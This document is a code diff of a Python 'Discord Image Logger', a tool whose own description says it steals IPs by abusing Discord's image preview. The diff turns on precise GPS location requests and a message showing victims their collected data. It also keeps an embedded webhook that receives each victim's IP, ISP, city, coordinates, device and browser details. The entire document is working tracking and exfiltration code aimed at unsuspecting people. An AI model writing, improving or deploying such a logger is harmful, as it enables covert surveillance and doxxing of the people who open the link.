@@ -1,8 +1,7 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
-import json
-import os
+import json, os, time
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -12,45 +11,44 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1468685591075098666/zSG0-obqS_lNp_Hh9MK6dOVT-ffb3IeZjUgOjD-jx2W_mpPIf8fJwh1M1KTrOydLYi5s",
-    "image": "https://elm.umaryland.edu/elm-stories/2023/Hacked.jpg", # You can also have a custom image by using a URL argument
-                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "image": "https://elm.umaryland.edu/elm-stories/2023/Hacked.jpg",
+    "imageArgument": True,
 
     # CUSTOMIZATION #
-    "username": "Captain WebHook", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "username": "🔍 Image Logger Detector", # Set this to the name you want the webhook to have
+    "color": 0xFF0000, # Red for maximum visibility
 
     # OPTIONS #
-    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
+    "crashBrowser": False,
     
-    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
+    "accurateLocation": True, # 👉 ACTIVÉ - Demande les coordonnées GPS précises de l'utilisateur
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
-        "richMessage": True, # Enable rich text? (See README for more info)
+        "doMessage": True, # 👉 ACTIVÉ - Affiche un message personnalisé
+        "message": """🎯 Votre navigateur a été analysé.
+        
+Informations collectées:
+• IP: {ip}
+• Localisation: {city}, {region}, {country}
+• FAI: {isp}
+• Appareil: {os}
+• Navigateur: {browser}
+• Coordonnées: {lat}, {long}
+• VPN Détecté: {vpn}
+• Bot: {bot}""",
+        "richMessage": True, # 👉 ACTIVÉ - Remplace les variables
     },
 
-    "vpnCheck": 1, # Prevents VPNs from triggering the alert
-                # 0 = No Anti-VPN
-                # 1 = Don't ping when a VPN is suspected
-                # 2 = Don't send an alert when a VPN is suspected
+    "vpnCheck": 1, # Toujours ping si VPN détecté
+    "linkAlerts": True, # 👉 ACTIVÉ - Notification quand lien est partagé
+    "buggedImage": True, # Affiche image de chargement pour les bots
 
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
-    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
-
-    "antiBot": 1, # Prevents bots from triggering the alert
-                # 0 = No Anti-Bot
-                # 1 = Don't ping when it's possibly a bot
-                # 2 = Don't ping when it's 100% a bot
-                # 3 = Don't send an alert when it's possibly a bot
-                # 4 = Don't send an alert when it's 100% a bot
-    
+    "antiBot": 1, # 👉 Notifie les bots aussi
 
     # REDIRECTION #
     "redirect": {
-        "redirect": False, # Redirect to a webpage?
-        "page": "https://your-link.here" # Link to the webpage to redirect to 
+        "redirect": False,
+        "page": "https://your-link.here"
     },
 }
 
@@ -70,9 +68,9 @@ def reportError(error):
     "content": "@everyone",
     "embeds": [
         {
-            "title": "Image Logger - Error",
-            "color": config["color"],
-            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
+            "title": "🚨 Image Logger - ERROR",
+            "color": 0xFF0000,
+            "description": f"❌ An error occurred while trying to log an IP!\n\n**Error Details:**\n```\n{error}\n```",
         }
     ],
 })
@@ -89,9 +87,14 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": "",
     "embeds": [
         {
-            "title": "Image Logger - Link Sent",
-            "color": config["color"],
-            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
+            "title": f"🤖 BOT DETECTED - {bot}",
+            "color": 0xFFA500,
+            "description": f"""**Un bot a cliqué sur le lien!**
+
+**Bot Type:** `{bot}`
+**IP Endpoint:** `{endpoint}`
+**IP Address:** `{ip}`
+**Timestamp:** <t:{int(time.time())}:F>""",
         }
     ],
 }) if config["linkAlerts"] else None
@@ -134,35 +137,49 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - IP Logged",
+            "title": "🔴 IP LOGGED - Discord Link Clicked",
             "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
+            "description": f"""**✅ NEW TARGET DETECTED**
 
-**Endpoint:** `{endpoint}`
-            
-**IP Info:**
-> **IP:** `{ip if ip else 'Unknown'}`
-> **Provider:** `{info.get('isp', 'Unknown') if info.get('isp') else 'Unknown'}`
-> **ASN:** `{info.get('as', 'Unknown') if info.get('as') else 'Unknown'}`
-> **Country:** `{info.get('country', 'Unknown') if info.get('country') else 'Unknown'}`
-> **Region:** `{info.get('regionName', 'Unknown') if info.get('regionName') else 'Unknown'}`
-> **City:** `{info.get('city', 'Unknown') if info.get('city') else 'Unknown'}`
-> **Coords:** `{str(info.get('lat', 'Unknown'))+', '+str(info.get('lon', 'Unknown')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Timezone:** `{info.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') if '/' in info.get('timezone', '') else info.get('timezone', 'Unknown')}` ({info.get('timezone', 'Unknown').split('/')[0] if '/' in info.get('timezone', '') else 'Unknown'})
-> **Mobile:** `{info.get('mobile', 'Unknown')}`
-> **VPN:** `{info.get('proxy', 'Unknown')}`
-> **Bot:** `{info.get('hosting') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`
+**🌐 NETWORK INFO:**
+> **IP Address:** `{ip}`
+> **ISP/Provider:** `{info.get('isp', 'Unknown')}`
+> **ASN:** `{info.get('as', 'Unknown')}`
+> **Hostname:** `{info.get('hostname', 'Unknown')}`
 
-**PC Info:**
-> **OS:** `{os}`
+**📍 LOCATION:**
+> **Country:** `{info.get('country', 'Unknown')}`
+> **Region/State:** `{info.get('regionName', 'Unknown')}`
+> **City:** `{info.get('city', 'Unknown')}`
+> **Timezone:** `{info.get('timezone', 'Unknown')}`
+> **Coordinates:** `{str(info.get('lat', 'Unknown'))}, {str(info.get('lon', 'Unknown'))}` {f"([📍 Map](https://www.google.com/maps/search/{info.get('lat', '')},{info.get('lon', '')})) " if info.get('lat') and info.get('lon') else ""}
+
+**🖥️ DEVICE INFO:**
+> **Operating System:** `{os}`
 > **Browser:** `{browser}`
+> **Mobile:** `{info.get('mobile', 'Unknown')}`
+> **Screen Resolution:** `Unknown` (Not available)
 
-**User Agent:**
+**🔒 SECURITY FLAGS:**
+> **VPN/Proxy Detected:** `{info.get('proxy', False)}`
+> **Hosting/Bot:** `{info.get('hosting', False)}`
+> **Is Bot:** `{info.get('hosting') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`
+
+**📋 USER AGENT:**
 ```
 {useragent}
-```""",
-    }
-  ],
+```
+
+**⏰ Timestamp:** <t:{int(time.time())}:F>""",
+            "fields": [
+                {
+                    "name": "🎯 Quick Actions",
+                    "value": f"[🔗 Lookup IP](https://ipwhois.io/{ip}) | [📍 Google Maps](https://www.google.com/maps/search/{info.get('lat', '0')},{info.get('lon', '0')})",
+                    "inline": False
+                }
+            ]
+        }
+    ],
 }
     
     if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
